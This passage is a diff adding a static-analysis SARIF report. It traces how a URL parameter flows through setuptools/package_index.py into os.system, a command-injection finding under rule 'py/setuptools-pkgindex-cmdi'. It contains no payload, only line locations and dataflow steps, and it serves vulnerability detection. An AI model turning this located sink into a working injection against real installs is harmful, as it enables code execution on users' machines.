+             },
+             "region": {
+              "startLine": 905,
+              "startColumn": 19,
+              "endColumn": 61
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 839,
+              "startColumn": 38,
+              "endColumn": 41
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 9,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 13,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 905,
+              "startColumn": 19,
+              "endColumn": 61
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 905,
+              "startColumn": 19,
+              "endColumn": 61
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 905,
+              "startColumn": 19,
+              "endColumn": 61
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      }
+     ],
+     "relatedLocations": [
+      {
+       "id": 1,
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 905,
+         "startColumn": 19,
+         "endColumn": 61
+        }
+       },
+       "message": {
+        "text": "command"
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 817,
+         "startColumn": 37,
+         "endColumn": 40
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 864,
+         "startColumn": 33,
+         "endColumn": 36
+        }
+       }
+      },
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 900,
+         "startColumn": 28,
+         "endColumn": 31
+        }
+       }
+      }
+     ]
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-cmdi",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-cmdi",
+      "index": 0
+     },
+     "message": {
+      "text": "URL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1)."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 910,
+         "startColumn": 17,
+         "endLine": 914,
+         "endColumn": 18
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "41c6097297f2b196:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     },
+     "codeFlows": [
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 839,
+              "startColumn": 38,
+              "endColumn": 41
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 910,
+              "startColumn": 17,
+              "endLine": 914,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 839,
+              "startColumn": 38,
+              "endColumn": 41
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 9,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 13,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 21,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute() [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 9,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple [Tuple element at index 1]"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 910,
+              "startColumn": 17,
+              "endLine": 914,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 14,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 910,
+              "startColumn": 17,
+              "endLine": 914,
+              "endColumn": 18
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 900,
+              "startColumn": 28,
+              "endColumn": 31
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 902,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
